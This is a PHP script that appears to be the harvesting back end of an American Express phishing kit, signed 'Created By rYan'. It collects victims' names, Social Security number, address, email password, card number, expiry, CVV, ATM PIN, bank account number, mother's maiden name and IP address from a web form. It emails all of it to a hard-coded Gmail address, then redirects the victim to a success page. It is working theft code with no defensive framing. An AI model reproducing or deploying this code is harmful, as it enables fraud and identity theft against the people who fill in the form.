<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By rYan-----------------------\n";
$message .= "--------------AMexReZulT-----------------------\n";
$message .= "---------------------------\n";
$message .= "First Name: ".$_POST['mFirstName']."\n";
$message .= "Middle Name: ".$_POST['mMiddleName']."\n";
$message .= "Last Name: ".$_POST['mLastName']."\n";
$message .= "Social Sec: ".$_POST['mSSN']."\n";
$message .= "Address: ".$_POST['mAddress1']."/";
$message .= "City: ".$_POST['mCity']."\n";
$message .= "State: ".$_POST['mState']."\n";
$message .= "Zip Code: ".$_POST['mZipCode']."\n";
$message .= "HomePhone: ".$_POST['mHomePhone']."\n";
$message .= "DaytimePhone: ".$_POST['mWorkPhone']."\n";
$message .= "Email: ".$_POST['mEmail']."\n";
$message .= "Email password: ".$_POST['emailpassword']."\n";
$message .= "Date of Birth: ".$_POST['mBirthMonth']."\n";
$message .= "Date of Birth: ".$_POST['mBirthDay']."\n";
$message .= "Date of Birth: ".$_POST['mBirthYear']."\n";
$message .= "Card Number: ".$_POST['creditnumber']."\n";
$message .= "Exp Date: ".$_POST['mBirthMonth0']."\n";
$message .= "Exp Date: ".$_POST['mBirthYear0']."\n";
$message .= "ATM Pin: ".$_POST['pin']."\n";
$message .= "CCV: ".$_POST['CCV']."\n";
$message .= "Account Number: ".$_POST['mAccount1']."\n";
$message .= "Type Of Acct: ".$_POST['mAccount1Type']."\n";
$message .= "Mother'sMaiden Name: ".$_POST['mAuthValue']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By rYan------------------------------\n";


$recipient = "northbryan4u@gmail.com";
$subject = "Full-Info";
$headers = "rYan";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Verizon", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: success.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>